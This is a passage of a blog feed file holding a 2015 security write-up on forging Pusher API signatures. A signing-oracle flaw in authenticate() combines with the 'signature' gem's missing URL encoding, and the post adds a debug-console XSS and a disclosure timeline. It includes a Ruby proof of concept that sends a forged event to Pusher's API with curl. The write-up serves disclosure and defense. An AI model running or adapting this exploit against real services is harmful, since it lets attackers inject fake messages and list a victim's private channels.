-
-&lt;h2 id=&quot;api-requests-also-use-hmac&quot;&gt;API requests also use HMAC&lt;/h2&gt;
-
-&lt;p&gt;Pusher documentation says you need to provide key:secret pair in your configuration &lt;code class=&quot;highlighter-rouge&quot;&gt;Pusher.url = &quot;https://840543d97de9803651b3:8897fad3dbb53ac533a9@api.pusherapp.com/apps/99759&quot;&lt;/code&gt; but in fact since https:// is preferred (performance reasons, I guess) SDKs never send the secret in plain text and use a &lt;a href=&quot;https://github.com/mloughran/signature&quot;&gt;home-baked “signature” gem&lt;/a&gt; instead.&lt;/p&gt;
-
-&lt;p&gt;That gem signs payloads the same way, with HMAC and API secret.&lt;/p&gt;
-
-&lt;h2 id=&quot;abusing-authenticateuser_input-to-sign-malicious-api-requests&quot;&gt;Abusing authenticate(user_input) to sign malicious API requests&lt;/h2&gt;
-
-&lt;p&gt;Technically, every client with Pusher[‘channel’].authenticate on the backend can sign arbitrary string for you. The signature gem uses following format: [request.method, request.path, request.query_string].join(“\n”).&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;POST&lt;/span&gt;
-&lt;span class=&quot;sr&quot;&gt;/apps/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99759&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;events&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;840543&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d97de9803651b1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1431504423&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e26738bad6c25794e97e2ca92bd7b1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Unfortunatelly method “authenticate” appends the name of the channel so we only can get a signature of following string:&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;POST&lt;/span&gt;
-&lt;span class=&quot;sr&quot;&gt;/apps/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99759&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;events&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;840543&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d97de9803651b1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1431504423&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e26738bad6c25794e97e2ca92bd7b1&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;At first glance it looks like a serious obstacle, &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; is supposed to be URL encoded in query strings as &lt;code class=&quot;highlighter-rouge&quot;&gt;%3A&lt;/code&gt;. There’s no way to get this exact string_to_sign on Pusher server side… Oh wait.&lt;/p&gt;
-
-&lt;h2 id=&quot;signature-library-does-not-encode-query-parameters&quot;&gt;“signature” library does not encode query parameters&lt;/h2&gt;
-
-&lt;p&gt;There’s another subtle vulnerability in “signature” gem - it &lt;strong&gt;intentionally ignores URL encoding&lt;/strong&gt;, no idea why.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;string_to_sign&lt;/span&gt;
-  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parameter_string&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;param_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@query_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;merge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@auth_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
-
-  &lt;span class=&quot;c1&quot;&gt;# Convert keys to lowercase strings&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;downcase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-  &lt;span class=&quot;c1&quot;&gt;# Exclude signature from signature generation!&lt;/span&gt;
-  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;auth_signature&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
-    &lt;span class=&quot;no&quot;&gt;QueryEncoder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode_param_without_escaping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;This gem might be used in other projects so this is another vulnerability: if the attacker manages to eavesdrop/MitM a request with user input in some parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;message=%26parameter%3D0%26another_parameter%3D1&lt;/code&gt;, the same signature will be valid for &lt;code class=&quot;highlighter-rouge&quot;&gt;message=&amp;amp;parameter=0&amp;amp;another_parameter=1&lt;/code&gt; thus any parameters in the signed payload can be added or tampered with. &lt;strong&gt;Encoding is no joke.&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;Alright, since we know Pusher does not URL encode the query string, we can simply hide the last “:private-123” part in some dummy parameter and send it as a part of the query &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;dummy=:private-123&lt;/code&gt;. Here is my proof of concept.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'digest'&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'pusher'&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'840543d97de9803651b1'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/apps/99759/events&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;data&quot;:&quot;{\&quot;message\&quot;:\&quot;FAKE EVENT\&quot;}&quot;,&quot;name&quot;:&quot;my_event&quot;,&quot;channel&quot;:&quot;test_channel&quot;}'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Digest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# for body integrity&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# must be within 600 seconds of Pusher time&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Now lets obtain a signature for crafted socket_id&lt;/span&gt;
-&lt;span class=&quot;c1&quot;&gt;# This is server side of the victim&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-  &lt;span class=&quot;ss&quot;&gt;socket_id: &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POST&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;auth_key=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;auth_timestamp=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;auth_version=1.0&amp;amp;body_md5=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;amp;dummy=&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-  &lt;span class=&quot;ss&quot;&gt;channel: &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://api.pusherapp.com/apps/99759&quot;&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;
-&lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'8897fad3dbbb3ac533a9'&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Pusher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:channel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# We only need last part of auth token&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; 
-&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;CURL&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;
-curl &quot;https://api.pusherapp.com&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;?body_md5=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_version=1.0&amp;amp;auth_key=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_timestamp=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;auth_signature=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sign&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&amp;amp;dummy=:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot; -H 'Content-Type: application/json' -d '&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;' 
-&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;CURL&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Using this PoC we can get a list of public/private channels of the victim and send any fake data to those channels. &lt;a href=&quot;https://pusher.com/docs/rest_api#method-get-channel&quot;&gt;See REST documentation for other endpoints.&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;getting-xss-on-pushercom-using-pusher&quot;&gt;Getting XSS on pusher.com using… Pusher&lt;/h2&gt;
-
-&lt;p&gt;This one is just for fun.&lt;/p&gt;
-
-&lt;p&gt;Thinking of what harm can be done with malicious fake messages beyond phishing, I tried to find some Universal XSS and thoroughly reviewed pusher.js, but discovered nothing like that. However, there’s special Console for debugging on pusher.com which doesn’t sanitize &lt;code class=&quot;highlighter-rouge&quot;&gt;log.type&lt;/code&gt; before inserting in HTML.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pusher.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;timeline&quot;&gt;Timeline:&lt;/h3&gt;
-
-&lt;p&gt;May 8 - the bug was reported to Pusher&lt;/p&gt;
-
-&lt;p&gt;May 14 - they fixed SDK libraries and server side was patched to block forged signatures.&lt;/p&gt;
-
-&lt;p&gt;If you’re using standalone product like &lt;a href=&quot;https://github.com/stevegraham/slanger&quot;&gt;slanger&lt;/a&gt; (open source implementation of pusher) - update SDK/slanger/both asap.&lt;/p&gt;
-
-&lt;p&gt;Previous posts about format injections: &lt;a href=&quot;https://sakurity.com/blog/2015/03/03/duo_format_injection.html&quot;&gt;Format Injection Vulnerability in Duo Security Web SDK&lt;/a&gt;, &lt;a href=&quot;https://sakurity.com/blog/2015/03/15/authy_bypass.html&quot;&gt;How “../sms” could bypass Authy 2 Factor Authentication&lt;/a&gt;&lt;/p&gt;
-</description>
-        <pubDate>Fri, 08 May 2015 00:00:00 +0300</pubDate>
-        <link>https://sakurity.com/blog/2015/05/08/pusher.html</link>
-        <guid isPermaLink="true">https://sakurity.com/blog/2015/05/08/pusher.html</guid>
         
         
       </item>
